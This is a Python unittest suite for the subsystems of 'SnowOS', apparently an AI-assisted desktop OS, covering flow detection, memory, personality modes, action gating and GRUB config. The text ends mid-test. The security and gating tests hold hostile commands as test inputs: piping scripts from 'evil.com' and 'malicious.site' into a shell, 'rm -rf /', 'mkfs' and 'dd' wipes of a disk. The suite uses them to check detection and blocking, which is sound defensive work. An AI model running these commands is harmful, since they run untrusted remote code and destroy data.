#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║           SnowOS Full OS Engineer Test Suite — v3.0                         ║
║  Author:   OS Engineering Team                                              ║
║  Scope:    End-to-end validation of all SnowOS subsystems:                  ║
║            Nyx AI, Flow Detection, GRUB/Boot Config, Behavioral Security,   ║
║            Memory & Vector Store, NJ Fault Engine, Deadlock Detection,      ║
║            UI Intelligence, Personality Engine, and System Health.          ║
╚══════════════════════════════════════════════════════════════════════════════╝

RUNNING:
    python3 -m pytest snowos-runtime/tests/test_snowos_full_suite.py -v --tb=short
    OR:
    python3 snowos-runtime/tests/test_snowos_full_suite.py
"""

import sys
import os
import json
import time
import re
import threading
import tempfile
import sqlite3
import unittest
import logging
from pathlib import Path
from collections import deque

# ─── Path Setup ─────────────────────────────────────────────────────────────
# __file__ is at: <repo>/snowos-runtime/tests/test_snowos_full_suite.py
# parents[0] = tests/, parents[1] = snowos-runtime/, parents[2] = repo root
ROOT = Path(__file__).resolve().parents[2]          # repo root
RUNTIME_SRC = ROOT / "snowos-runtime" / "src"

sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(RUNTIME_SRC))
sys.path.insert(0, str(RUNTIME_SRC / "ai_core" / "nyx_kernel"))
sys.path.insert(0, str(RUNTIME_SRC / "kernel_layer"))
sys.path.insert(0, str(RUNTIME_SRC / "kernel_layer" / "io_hardware"))
sys.path.insert(0, str(RUNTIME_SRC / "kernel_layer" / "performance"))
sys.path.insert(0, str(RUNTIME_SRC / "system_services"))
sys.path.insert(0, str(ROOT / "ai"))

logging.disable(logging.CRITICAL)   # keep test output clean

PASS = "\033[92m✓\033[0m"
FAIL = "\033[91m✗\033[0m"


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 1: Nyx AI Core — Flow State Detector
# ══════════════════════════════════════════════════════════════════════════════
class TestFlowStateDetector(unittest.TestCase):
    """OS Engineer: Flow State Detector must reliably track deep-work sessions."""

    def setUp(self):
        from flow_state_detector import FlowStateDetector, DEEP_WORK_CLASSES
        self.FlowStateDetector = FlowStateDetector
        self.DEEP_WORK_CLASSES = DEEP_WORK_CLASSES
        self.memory = {}
        self.detector = FlowStateDetector(nyx_memory=self.memory)

    # ── 1.1 Deep-work app recognition ───────────────────────────────────────
    def test_deep_work_app_ide_recognized(self):
        """IDEs must be recognized as deep-work apps."""
        for app in ["code", "pycharm", "intellij", "clion"]:
            with self.subTest(app=app):
                self.assertTrue(self.detector._is_deep_work_app(app),
                                f"'{app}' should be a deep-work app")

    def test_deep_work_app_terminals_recognized(self):
        """Terminal emulators must be classified as deep-work apps."""
        for app in ["gnome-terminal", "alacritty", "kitty", "konsole"]:
            with self.subTest(app=app):
                self.assertTrue(self.detector._is_deep_work_app(app))

    def test_deep_work_app_editors_recognized(self):
        """Text editors must be classified as deep-work apps."""
        for app in ["vim", "nvim", "emacs", "nano", "gedit"]:
            with self.subTest(app=app):
                self.assertTrue(self.detector._is_deep_work_app(app))

    def test_non_deep_work_app_rejected(self):
        """Social media / game apps must NOT be deep-work apps."""
        for app in ["discord", "steam", "netflix", "spotify", "telegram"]:
            with self.subTest(app=app):
                self.assertFalse(self.detector._is_deep_work_app(app),
                                 f"'{app}' should NOT be a deep-work app")

    def test_case_insensitive_matching(self):
        """App name matching must be case-insensitive."""
        self.assertTrue(self.detector._is_deep_work_app("CODE"))
        self.assertTrue(self.detector._is_deep_work_app("Vim"))
        self.assertTrue(self.detector._is_deep_work_app("GNOME-TERMINAL"))

    # ── 1.2 Context parsing ──────────────────────────────────────────────────
    def test_read_context_returns_empty_dict_when_no_file(self):
        """Context read on missing file must return empty dict, not raise."""
        # Temporarily point at a non-existent path
        import flow_state_detector as fsd
        orig = fsd.CONTEXT_FILE
        fsd.CONTEXT_FILE = "/tmp/__nonexistent_snowos_ctx_12345.json"
        ctx = self.detector._read_context()
        fsd.CONTEXT_FILE = orig
        self.assertIsInstance(ctx, dict)
        self.assertEqual(ctx, {})

    def test_read_context_returns_dict_on_corrupt_json(self):
        """Context read on corrupt JSON must return empty dict gracefully."""
        with tempfile.NamedTemporaryFile(suffix=".json", delete=False, mode="w") as f:
            f.write("{corrupt: json{{{{")
            ctx_path = f.name
        import flow_state_detector as fsd
        orig = fsd.CONTEXT_FILE
        fsd.CONTEXT_FILE = ctx_path
        ctx = self.detector._read_context()
        fsd.CONTEXT_FILE = orig
        os.unlink(ctx_path)
        self.assertIsInstance(ctx, dict)

    # ── 1.3 Evaluate flow state logic ───────────────────────────────────────
    def test_evaluate_flow_rejects_non_deepwork_app(self):
        """Flow evaluation must return False for non-deep-work app."""
        ctx = {"active_window": {"wm_class": "discord", "title": "Discord"}}
        should_flow, reason = self.detector._evaluate_flow(ctx)
        self.assertFalse(should_flow)
        self.assertIn("discord", reason)

    def test_evaluate_flow_rejects_insufficient_session_time(self):
        """Flow must not activate before MIN_SESSION_SEC seconds in same window."""
        ctx = {"active_window": {"wm_class": "code", "title": "VS Code"}}
        # Fresh window — time_in_window == 0
        should_flow, reason = self.detector._evaluate_flow(ctx)
        self.assertFalse(should_flow)

    def test_evaluate_flow_resets_on_window_switch(self):
        """Flow must exit immediately if window is switched."""
        self.detector._flow_active = True
        self.detector._current_window_class = "code"
        ctx = {"active_window": {"wm_class": "firefox", "title": "Firefox"}}
        should_flow, reason = self.detector._evaluate_flow(ctx)
        self.assertFalse(should_flow)
        self.assertIn("firefox", reason.lower())

    # ── 1.4 Flow enter / exit lifecycle ─────────────────────────────────────
    def test_on_flow_enter_sets_memory_state(self):
        """Entering flow must set memory['_flow_state'] = 'deep_work'."""
        self.detector._on_flow_enter("code for 200s")
        self.assertEqual(self.memory.get("_flow_state"), "deep_work")
        self.assertIn("_flow_entered_ts", self.memory)

    def test_on_flow_exit_resets_memory_state(self):
        """Exiting flow must set memory['_flow_state'] = 'idle'."""
        self.detector._on_flow_enter("code for 200s")
        self.detector._on_flow_exit("window switched")
        self.assertEqual(self.memory.get("_flow_state"), "idle")
        self.assertIn("_last_flow_duration_sec", self.memory)

    def test_on_flow_exit_duration_is_non_negative(self):
        """Flow duration recorded after exit must be >= 0."""
        self.detector._on_flow_enter("test")
        time.sleep(0.05)
        self.detector._on_flow_exit("test exit")
        self.assertGreaterEqual(self.memory.get("_last_flow_duration_sec", 0), 0)

    def test_on_flow_enter_publishes_event_to_bus(self):
        """Flow entry must publish to EventBus if provided."""
        events = []

        class MockBus:
            def publish(self, topic, data): events.append((topic, data))

        self.detector.bus = MockBus()
        self.detector._on_flow_enter("test reason")
        self.assertTrue(any(t == "flow_state_entered" for t, _ in events))

    def test_on_flow_exit_publishes_event_to_bus(self):
        """Flow exit must publish to EventBus if provided."""
        events = []

        class MockBus:
            def publish(self, topic, data): events.append((topic, data))

        self.detector.bus = MockBus()
        self.detector._on_flow_enter("start")
        self.detector._on_flow_exit("stop")
        self.assertTrue(any(t == "flow_state_exited" for t, _ in events))

    # ── 1.5 Status API ──────────────────────────────────────────────────────
    def test_get_status_returns_required_keys(self):
        """get_status must always return mandatory keys."""
        status = self.detector.get_status()
        for key in ["flow_active", "current_app", "time_in_window", "flow_state"]:
            self.assertIn(key, status)

    def test_is_flowing_property_tracks_state(self):
        """is_flowing property must mirror _flow_active correctly."""
        self.assertFalse(self.detector.is_flowing)
        self.detector._flow_active = True
        self.assertTrue(self.detector.is_flowing)

    def test_start_stop_thread_lifecycle(self):
        """Detector thread must start and stop cleanly."""
        self.detector.start()
        time.sleep(0.05)
        self.assertIsNotNone(self.detector._thread)
        self.assertTrue(self.detector._thread.is_alive())
        self.detector.stop()
        # Thread is daemon — just verify stop flag is set
        self.assertTrue(self.detector._stop.is_set())


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 2: Behavioral Security Engine
# ══════════════════════════════════════════════════════════════════════════════
class TestBehavioralSecurity(unittest.TestCase):
    """OS Engineer: Security engine must detect all known attack patterns."""

    def setUp(self):
        from security.behavioral import BehavioralSecurity
        self.sec = BehavioralSecurity()

    # ── 2.1 Dangerous pattern detection ─────────────────────────────────────
    def test_rm_rf_root_flagged(self):
        """`rm -rf /` must be flagged as high-risk."""
        is_anomalous, score = self.sec.is_anomalous("rm -rf /")
        self.assertTrue(is_anomalous, f"rm -rf / not flagged (score={score:.2f})")
        self.assertGreater(score, 0.65)

    def test_curl_pipe_bash_flagged(self):
        """`curl ... | bash` must be flagged as high-risk."""
        is_anomalous, score = self.sec.is_anomalous("curl http://malicious.site/payload | bash")
        self.assertTrue(is_anomalous, f"curl|bash not flagged (score={score:.2f})")

    def test_wget_pipe_sh_flagged(self):
        """`wget ... | sh` must be flagged as high-risk."""
        is_anomalous, score = self.sec.is_anomalous("wget http://evil.com/pwn.sh | sh")
        self.assertTrue(is_anomalous, f"wget|sh not flagged (score={score:.2f})")

    def test_write_to_dev_mem_flagged(self):
        """`>/dev/mem` direct memory write must be flagged."""
        is_anomalous, score = self.sec.is_anomalous("cat payload >/dev/mem")
        self.assertTrue(is_anomalous, f">/dev/mem not flagged (score={score:.2f})")

    def test_safe_git_push_not_flagged(self):
        """`git push` must NOT be flagged as anomalous."""
        is_anomalous, score = self.sec.is_anomalous("git push origin main")
        self.assertFalse(is_anomalous,
                         f"'git push' wrongly flagged as anomalous (score={score:.2f})")

    def test_safe_ls_not_flagged(self):
        """`ls -la` must NOT be flagged."""
        is_anomalous, score = self.sec.is_anomalous("ls -la /home")
        self.assertFalse(is_anomalous,
                         f"'ls -la' wrongly flagged (score={score:.2f})")

    def test_safe_python_script_not_flagged(self):
        """`python3 script.py` must NOT be flagged."""
        is_anomalous, score = self.sec.is_anomalous("python3 manage.py runserver")
        self.assertFalse(is_anomalous,
                         f"'python3 manage.py' wrongly flagged (score={score:.2f})")

    def test_score_bounds(self):
        """Risk score must always be in [0.0, 1.0]."""
        for cmd in ["ls", "rm -rf /", "git commit -m test", "curl http://x.com | bash"]:
            score = self.sec.score_command(cmd)
            self.assertGreaterEqual(score, 0.0, f"Score < 0 for: {cmd}")
            self.assertLessEqual(score, 1.0, f"Score > 1.0 for: {cmd}")

    def test_is_anomalous_returns_tuple(self):
        """is_anomalous must return (bool, float) tuple."""
        result = self.sec.is_anomalous("ls")
        self.assertIsInstance(result, tuple)
        self.assertEqual(len(result), 2)
        self.assertIsInstance(result[0], bool)
        self.assertIsInstance(result[1], float)

    def test_rm_rf_variant_with_flags(self):
        """`rm -rf --no-preserve-root /` is equally dangerous and must be flagged."""
        is_anomalous, score = self.sec.is_anomalous("rm -rf --no-preserve-root /")
        # Pattern `rm\s+-rf\s+/` still matches
        self.assertTrue(is_anomalous or score > 0.5,
                        f"rm -rf variant not caught (score={score:.2f})")

    def test_sudo_rm_rf_root_flagged(self):
        """`sudo rm -rf /` must be flagged."""
        is_anomalous, score = self.sec.is_anomalous("sudo rm -rf /")
        self.assertTrue(is_anomalous or score > 0.5,
                        f"sudo rm -rf / not caught (score={score:.2f})")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 3: Memory Logger (SQLite Persistence)
# ══════════════════════════════════════════════════════════════════════════════
class TestMemoryLogger(unittest.TestCase):
    """OS Engineer: MemoryLogger must persist all kernel event logs reliably."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        db_path = os.path.join(self.tmp, "nyx", "memory", "memory.db")
        from memory.logger import MemoryLogger
        self.logger = MemoryLogger(db_path=db_path)

    # ── 3.1 DB initialization ────────────────────────────────────────────────
    def test_db_file_created_on_init(self):
        """SQLite DB file must exist after init."""
        self.assertTrue(os.path.exists(self.logger.db_path))

    def test_db_has_command_history_table(self):
        """command_history table must exist in DB."""
        conn = sqlite3.connect(self.logger.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='command_history'")
        result = cursor.fetchone()
        conn.close()
        self.assertIsNotNone(result, "command_history table not found")

    # ── 3.2 Log events ──────────────────────────────────────────────────────
    def test_log_event_writes_to_db(self):
        """log_event must write a record to the database."""
        self.logger.log_event("git push", "push to origin", "success")
        rows = self.logger.get_recent_history(limit=10)
        self.assertEqual(len(rows), 1)

    def test_log_event_all_fields_stored(self):
        """All four fields (timestamp, command, action, status) must be stored."""
        self.logger.log_event("sudo apt install vim", "install vim", "success")
        rows = self.logger.get_recent_history(1)
        self.assertEqual(len(rows), 1)
        ts, cmd, action, status = rows[0]
        self.assertIsNotNone(ts)
        self.assertEqual(cmd, "sudo apt install vim")
        self.assertEqual(action, "install vim")
        self.assertEqual(status, "success")

    def test_multiple_events_stored_in_order(self):
        """Multiple events must be retrievable in reverse-chronological order."""
        self.logger.log_event("cmd1", "action1", "ok")
        self.logger.log_event("cmd2", "action2", "ok")
        self.logger.log_event("cmd3", "action3", "ok")
        rows = self.logger.get_recent_history(limit=10)
        self.assertEqual(len(rows), 3)
        # Most recent first
        commands = [r[1] for r in rows]
        self.assertEqual(commands[0], "cmd3")

    def test_limit_parameter_respected(self):
        """get_recent_history must respect the limit parameter."""
        for i in range(10):
            self.logger.log_event(f"cmd{i}", f"action{i}", "ok")
        rows = self.logger.get_recent_history(limit=3)
        self.assertEqual(len(rows), 3)

    def test_empty_history_returns_empty_list(self):
        """get_recent_history on empty DB must return empty list, not raise."""
        rows = self.logger.get_recent_history()
        self.assertIsInstance(rows, list)
        self.assertEqual(len(rows), 0)

    def test_log_event_does_not_raise_on_failure(self):
        """log_event must not raise even if DB path becomes invalid."""
        self.logger.db_path = "/dev/null/__bad_path__/nope.db"
        try:
            self.logger.log_event("test", "test", "test")  # Must not raise
        except Exception as e:
            self.fail(f"log_event raised unexpectedly: {e}")

    def test_log_event_unicode_command(self):
        """Commands with unicode/emoji characters must be stored correctly."""
        self.logger.log_event("echo '❄️ SnowOS'", "print snowflake", "success")
        rows = self.logger.get_recent_history(1)
        self.assertIn("❄️", rows[0][1])


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 4: Vector Memory (Fallback + Storage)
# ══════════════════════════════════════════════════════════════════════════════
class TestVectorMemory(unittest.TestCase):
    """OS Engineer: Vector memory must store and retrieve data even without chromadb."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        from memory.vector_db import VectorMemory, _FallbackCollection
        self.VectorMemory = VectorMemory
        self._FallbackCollection = _FallbackCollection
        self.vmem = VectorMemory(db_path=self.tmp)

    # ── 4.1 Fallback collection ──────────────────────────────────────────────
    def test_fallback_collection_add_and_query(self):
        """FallbackCollection must store and retrieve items by text similarity."""
        coll_path = os.path.join(self.tmp, "test_fallback.json")
        coll = self._FallbackCollection(coll_path)
        coll.add(["Install GRUB bootloader"], metadatas=[{"tag": "grub"}])
        result = coll.query(["GRUB boot"], n_results=1)
        self.assertIn("documents", result)
        self.assertTrue(len(result["documents"]) > 0)

    def test_fallback_collection_persists_to_disk(self):
        """FallbackCollection must persist data to JSON on disk."""
        coll_path = os.path.join(self.tmp, "persist_test.json")
        coll = self._FallbackCollection(coll_path)
        coll.add(["SnowOS kernel event"], ids=["evt-001"])
        # Reload from disk
        coll2 = self._FallbackCollection(coll_path)
        self.assertEqual(len(coll2.items), 1)
        self.assertEqual(coll2.items[0]["document"], "SnowOS kernel event")

    def test_fallback_collection_distance_range(self):
        """Query distances must be in [0.0, 1.0]."""
        coll_path = os.path.join(self.tmp, "dist_test.json")
        coll = self._FallbackCollection(coll_path)
        coll.add(["alpha beta gamma"], ["delta epsilon"], ["zeta eta theta"])
        result = coll.query(["alpha"], n_results=3)
        for dist in result["distances"][0]:
            self.assertGreaterEqual(dist, 0.0)
            self.assertLessEqual(dist, 1.0)

    def test_fallback_identical_query_has_zero_distance(self):
        """Querying exact same text must return distance of 0.0."""
        coll_path = os.path.join(self.tmp, "exact_test.json")
        coll = self._FallbackCollection(coll_path)
        coll.add(["snowos grub boot fix"], ids=["id1"])
        result = coll.query(["snowos grub boot fix"], n_results=1)
        self.assertEqual(result["distances"][0][0], 0.0)

    # ── 4.2 VectorMemory API ─────────────────────────────────────────────────
    def test_vector_memory_add_and_query(self):
        """VectorMemory.add_interaction must make items queryable."""
        self.vmem.add_interaction("user installed nvidia driver", {"type": "system"})
        result = self.vmem.query("nvidia driver")
        self.assertIn("documents", result)

    def test_vector_memory_clear(self):
        """VectorMemory.clear must wipe all stored interactions."""
        self.vmem.add_interaction("test document 1")
        self.vmem.add_interaction("test document 2")
        self.vmem.clear()
        result = self.vmem.query("test document")
        docs = result.get("documents", [[]])
        all_docs = [d for sublist in docs for d in sublist]
        self.assertEqual(len(all_docs), 0)

    def test_vector_memory_has_collection_attribute(self):
        """VectorMemory must expose a .collection attribute."""
        self.assertTrue(hasattr(self.vmem, "collection"))
        self.assertIsNotNone(self.vmem.collection)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 5: Pure-Python TF-IDF Retriever (NyxRetriever fallback)
# ══════════════════════════════════════════════════════════════════════════════
class TestPurePythonTfidf(unittest.TestCase):
    """OS Engineer: Pure-Python TF-IDF ranker must work without sklearn."""

    def setUp(self):
        from learning.retriever import _PurePythonTfidf
        self.tfidf = _PurePythonTfidf()
        self.corpus = [
            "GRUB bootloader VM display mode configuration",
            "GDM login screen glassmorphic theme CSS",
            "Nyx AI cognitive engine flow state deep work",
            "systemd service watchdog healing bridge",
            "SnowOS deadlock detection resource allocation graph",
        ]
        self.tfidf.fit(self.corpus)

    def test_search_returns_relevant_result(self):
        """Search must return the most relevant document first."""
        results = self.tfidf.search("GRUB bootloader", top_k=1)
        self.assertTrue(len(results) >= 1)
        self.assertIn("GRUB", results[0])

    def test_search_returns_at_most_top_k(self):
        """Search must return at most top_k results."""
        results = self.tfidf.search("snowos", top_k=2)
        self.assertLessEqual(len(results), 2)

    def test_search_empty_corpus_returns_empty(self):
        """Search on empty corpus must return empty list."""
        from learning.retriever import _PurePythonTfidf
        empty_tfidf = _PurePythonTfidf()
        results = empty_tfidf.search("anything")
        self.assertEqual(results, [])

    def test_search_unrelated_query_returns_nothing(self):
        """Query with zero-overlap tokens must return empty list."""
        from learning.retriever import _PurePythonTfidf
        tfidf = _PurePythonTfidf()
        tfidf.fit(["apple orange banana"])
        results = tfidf.search("kubernetes docker swarm")
        self.assertEqual(results, [])

    def test_stopwords_filtered(self):
        """Stop words must be filtered from index."""
        tokens = self.tfidf._tokenize("what is the configuration of a the")
        self.assertNotIn("the", tokens)
        self.assertNotIn("is", tokens)
        self.assertNotIn("a", tokens)
        self.assertNotIn("what", tokens)

    def test_fit_builds_idf_table(self):
        """fit() must build a non-empty IDF table."""
        self.assertGreater(len(self.tfidf.idf), 0)

    def test_search_gdm_theme(self):
        """GDM theme query must hit the correct corpus document."""
        results = self.tfidf.search("GDM login CSS theme", top_k=3)
        self.assertTrue(any("GDM" in r for r in results))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 6: Personality Engine
# ══════════════════════════════════════════════════════════════════════════════
class TestPersonalityEngine(unittest.TestCase):
    """OS Engineer: Personality engine must manage behavioral modes correctly."""

    def setUp(self):
        from personality.engine import PersonalityEngine
        self.engine = PersonalityEngine()

    def test_default_mode_is_valid(self):
        """Default mode must be one of the known profiles."""
        self.assertIn(self.engine.current_mode, self.engine.profiles)

    def test_all_default_profiles_present(self):
        """All four core modes must be present in profiles."""
        for mode in ["calm", "assistive", "autonomous", "developer"]:
            self.assertIn(mode, self.engine.profiles,
                          f"Profile '{mode}' missing from PersonalityEngine")

    def test_set_mode_changes_current_mode(self):
        """set_mode must update current_mode."""
        self.engine.set_mode("calm")
        self.assertEqual(self.engine.current_mode, "calm")
        self.engine.set_mode("autonomous")
        self.assertEqual(self.engine.current_mode, "autonomous")

    def test_set_invalid_mode_does_not_change_mode(self):
        """set_mode with invalid profile must not change the current mode."""
        before = self.engine.current_mode
        self.engine.set_mode("nonexistent_profile_xyz")
        self.assertEqual(self.engine.current_mode, before)

    def test_get_current_config_returns_dict(self):
        """get_current_config must return a non-empty dict."""
        config = self.engine.get_current_config()
        self.assertIsNotNone(config)
        self.assertIsInstance(config, dict)
        self.assertGreater(len(config), 0)

    def test_each_profile_has_confidence_threshold(self):
        """Each profile must define a confidence_threshold."""
        for mode, config in self.engine.profiles.items():
            self.assertIn("confidence_threshold", config,
                          f"Profile '{mode}' missing confidence_threshold")

    def test_each_profile_has_auto_action(self):
        """Each profile must define auto_action."""
        for mode, config in self.engine.profiles.items():
            self.assertIn("auto_action", config,
                          f"Profile '{mode}' missing auto_action")

    def test_developer_mode_has_highest_threshold(self):
        """Developer mode must require the highest confidence threshold."""
        dev_threshold = self.engine.profiles["developer"]["confidence_threshold"]
        calm_threshold = self.engine.profiles["calm"]["confidence_threshold"]
        self.assertGreaterEqual(dev_threshold, calm_threshold)

    def test_autonomous_mode_allows_auto_action(self):
        """Autonomous mode must have auto_action = True."""
        self.assertTrue(self.engine.profiles["autonomous"]["auto_action"])

    def test_calm_mode_disallows_auto_action(self):
        """Calm mode must have auto_action = False."""
        self.assertFalse(self.engine.profiles["calm"]["auto_action"])


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 7: Action Gating (Safety Check)
# ══════════════════════════════════════════════════════════════════════════════
class TestActionGating(unittest.TestCase):
    """OS Engineer: ActionGating is the last safety wall before autonomous action."""

    def setUp(self):
        from personality.engine import PersonalityEngine
        from personality.trust import TrustEngine
        from personality.gating import ActionGating
        from memory.logger import MemoryLogger

        tmp = tempfile.mkdtemp()
        db = os.path.join(tmp, "nyx", "memory", "memory.db")
        self.logger = MemoryLogger(db_path=db)
        self.persona = PersonalityEngine()
        self.trust = TrustEngine(self.logger)
        self.gating = ActionGating(self.persona, self.trust)

    def test_assistive_mode_blocks_all_auto_actions(self):
        """In assistive mode, ALL actions must require manual confirmation."""
        self.persona.set_mode("assistive")
        allowed, reason = self.gating.validate_action("git push")
        self.assertFalse(allowed)
        self.assertIn("manual confirmation", reason.lower())

    def test_calm_mode_blocks_all_auto_actions(self):
        """In calm mode, ALL actions must require manual confirmation."""
        self.persona.set_mode("calm")
        allowed, reason = self.gating.validate_action("ls -la")
        self.assertFalse(allowed)

    def test_destructive_command_blocked_in_any_mode(self):
        """Destructive commands (rm -rf, mkfs, dd) must always be blocked."""
        self.persona.set_mode("autonomous")
        for cmd in ["rm -rf /", "mkfs /dev/sda", "dd if=/dev/zero of=/dev/sda"]:
            allowed, reason = self.gating.validate_action(cmd)
            self.assertFalse(allowed, f"Destructive cmd '{cmd}' was allowed!")
            self.assertIn("destructive", reason.lower())

    def test_validate_action_returns_tuple(self):
        """validate_action must return (bool, str) tuple."""
        result = self.gating.validate_action("git status")
        self.assertIsInstance(result, tuple)
        self.assertEqual(len(result), 2)
        self.assertIsInstance(result[0], bool)
        self.assertIsInstance(result[1], str)


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 8: UI Intelligence — Window AI
# ══════════════════════════════════════════════════════════════════════════════
class TestWindowAI(unittest.TestCase):
    """OS Engineer: WindowAI must propose correct layouts for known apps."""

    def setUp(self):
        from ui_intelligence.window_ai import WindowAI
        self.win = WindowAI()

    def test_code_gets_split_layout_with_terminal(self):
        """VS Code must be paired with terminal in split-view."""
        self.win._last_proposal_ts = 0.0  # bypass rate-limit
        # Simulate propose_arrangement_for with known app
        companion = self.win.pairings.get("code")
        self.assertEqual(companion, "terminal")

    def test_firefox_gets_split_layout_with_files(self):
        """Firefox must be paired with files."""
        companion = self.win.pairings.get("firefox")
        self.assertEqual(companion, "files")

    def test_unknown_app_has_no_pairing(self):
        """Unknown app must return None companion → focus layout."""
        companion = self.win.pairings.get("unknown_exotic_app_xyz")
        self.assertIsNone(companion)

    def test_get_layout_suggestion_returns_dict(self):
        """get_layout_suggestion must return a dict with required keys."""
        suggestion = self.win.get_layout_suggestion()
        for key in ["active_app", "companion", "layout", "predicted"]:
            self.assertIn(key, suggestion)

    def test_get_layout_suggestion_layout_is_split_or_focus(self):
        """Layout must always be either 'split' or 'focus'."""
        suggestion = self.win.get_layout_suggestion()
        self.assertIn(suggestion["layout"], ["split", "focus"])

    def test_all_known_apps_in_pairings(self):
        """All known apps in pairings dict must have valid string companions."""
        for app, companion in self.win.pairings.items():
            self.assertIsInstance(app, str)
            self.assertIsInstance(companion, str)
            self.assertGreater(len(companion), 0, f"Companion for '{app}' is empty")

    def test_rate_limiting_prevents_rapid_proposals(self):
        """Rapid propose_arrangement_for calls must be rate-limited."""
        events = []

        def mock_publish(ev_type, data):
            events.append(ev_type)

        self.win._publish = mock_publish
        self.win._last_proposal_ts = time.time()  # Reset timestamp so rate-limit kicks in
        self.win.propose_arrangement_for("code")
        self.assertEqual(len(events), 0, "Rate limit was bypassed")

    def test_same_app_consecutive_no_duplicate_proposal(self):
        """Same app in back-to-back calls must not emit duplicate proposals."""
        events = []
        self.win._publish = lambda ev, data: events.append(ev)
        self.win._last_proposal_ts = 0.0
        self.win.propose_arrangement_for("code")
        event_count_first = len(events)
        self.win._last_proposal_ts = 0.0
        self.win.propose_arrangement_for("code")  # Same app again
        self.assertEqual(len(events), event_count_first,
                         "Same app triggered a duplicate proposal")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 9: GRUB Boot Configuration Integrity
# ══════════════════════════════════════════════════════════════════════════════
class TestGRUBConfigIntegrity(unittest.TestCase):
    """OS Engineer: GRUB config script must contain all VM-critical settings."""

    def setUp(self):
        self.branding_script = ROOT / "apply_branding.sh"
        self.visuals_script = ROOT / "apply_snowos_visuals.sh"
        with open(self.branding_script) as f:
            self.branding_content = f.read()
        with open(self.visuals_script) as f:
            self.visuals_content = f.read()

    def test_grub_gfxmode_set_to_safe_resolution(self):
        """apply_branding.sh must set GRUB_GFXMODE to 1024x768 (VM-safe)."""
        self.assertIn("GRUB_GFXMODE", self.branding_content,
                      "GRUB_GFXMODE not set in apply_branding.sh")
        self.assertIn("1024x768", self.branding_content,
                      "GRUB_GFXMODE not set to VM-safe 1024x768")

    def test_grub_timeout_style_is_menu(self):
        """GRUB must use 'menu' timeout style so menu is visible on VM boot."""
        self.assertIn("GRUB_TIMEOUT_STYLE=menu", self.branding_content,
                      "GRUB_TIMEOUT_STYLE=menu not set — GRUB menu will be hidden on VM boot!")

    def test_grub_timeout_greater_than_zero(self):
        """GRUB timeout must be > 0 seconds so user can select entries."""
        # Match GRUB_TIMEOUT=N where N > 0
        match = re.search(r"GRUB_TIMEOUT=(\d+)", self.branding_content)
        self.assertIsNotNone(match, "GRUB_TIMEOUT not found in apply_branding.sh")
        timeout = int(match.group(1))
        self.assertGreater(timeout, 0,
                           f"GRUB_TIMEOUT={timeout} — GRUB will skip menu instantly!")

    def test_grub_gfxpayload_linux_keep_set(self):
        """GRUB_GFXPAYLOAD_LINUX must be set (auto or keep) to preserve framebuffer into kernel."""
        has_payload = ("GRUB_GFXPAYLOAD_LINUX=auto" in self.branding_content or
                       'GRUB_GFXPAYLOAD_LINUX="auto"' in self.branding_content or
                       "GRUB_GFXPAYLOAD_LINUX=keep" in self.branding_content or
                       'GRUB_GFXPAYLOAD_LINUX="keep"' in self.branding_content)
        self.assertTrue(has_payload,
                        "GRUB_GFXPAYLOAD_LINUX not set — kernel may lose framebuffer on VM")

    def test_update_grub_called(self):
        """apply_branding.sh must call update-grub to regenerate grub.cfg."""
        self.assertIn("update-grub", self.branding_content,
                      "update-grub not called in apply_branding.sh")

    def test_backup_grub_config_before_modification(self):
        """Script must backup /etc/default/grub before modifying it."""
        has_backup = ("grub.bak" in self.branding_content or
                      "grub.snowos.bak" in self.branding_content or
                      ".bak" in self.branding_content)
        self.assertTrue(has_backup, "No backup of /etc/default/grub before modification!")

    def test_gdm_gresource_size_validation_present(self):
        """GDM gresource size must be validated (>= 200KB) before replacement."""
        has_size_check = ("200" in self.branding_content and
                          ("wc" in self.branding_content or
                           "stat" in self.branding_content or
                           "ls" in self.branding_content))
        self.assertTrue(has_size_check,
                        "No GDM gresource size validation! Corrupt theme can crash GDM.")

    def test_rollback_handler_present(self):
        """Script must have a rollback/cleanup handler."""
        has_rollback = ("rollback" in self.branding_content.lower() or
                        "cleanup" in self.branding_content.lower() or
                        "trap" in self.branding_content)
        self.assertTrue(has_rollback, "No rollback/cleanup trap in apply_branding.sh!")

    def test_visuals_script_also_sets_grub_gfxmode(self):
        """apply_snowos_visuals.sh must also set GRUB_GFXMODE for VM safety."""
        self.assertIn("GRUB_GFXMODE", self.visuals_content,
                      "apply_snowos_visuals.sh is missing GRUB_GFXMODE setting")


# ══════════════════════════════════════════════════════════════════════════════
# MODULE 10: NJ Fault Isolation Engine
# ══════════════════════════════════════════════════════════════════════════════
class TestNJFaultIsolation(unittest.TestCase):
    """OS Engineer: NJ engine must trap crashes and activate circuit breakers."""

    def setUp(self):
        from performance.nj_engine import NJFaultDomain, NJSupervisor
        self.NJFaultDomain = NJFaultDomain
        self.NJSupervisor = NJSupervisor

    def _make_domain(self, max_crashes=3, window=10.0, quarantine=2.0):
        return self.NJFaultDomain(
            domain_id="TestDomain",
            max_crashes=max_crashes,
            window_sec=window,
            quarantine_sec=quarantine,
        )

    def test_clean_callable_executes_without_isolation(self):
        """Normal (non-crashing) callable must run and return correctly."""
        domain = self._make_domain()
        success, result = domain.execute(lambda: 42 * 2)
        self.assertTrue(success)
        self.assertEqual(result, 84)

    def test_crashing_callable_trapped_and_returns_none(self):
        """Crashing callable must be caught and return None (not re-raise)."""
        domain = self._make_domain(max_crashes=10)
        success, result = domain.execute(lambda: 1 / 0)
        self.assertFalse(success)
        self.assertIsNone(result)

    def test_circuit_breaker_trips_after_max_crashes(self):
        """Circuit breaker must activate after max_crashes threshold."""
        domain = self._make_domain(max_crashes=3, quarantine=0.1)
        for _ in range(3):
            domain.execute(lambda: (_ for _ in ()).throw(RuntimeError("test")))
        self.assertTrue(domain.is_quarantined,
                        "Circuit breaker did not activate after max crashes")

    def test_quarantine_blocks_execution(self):
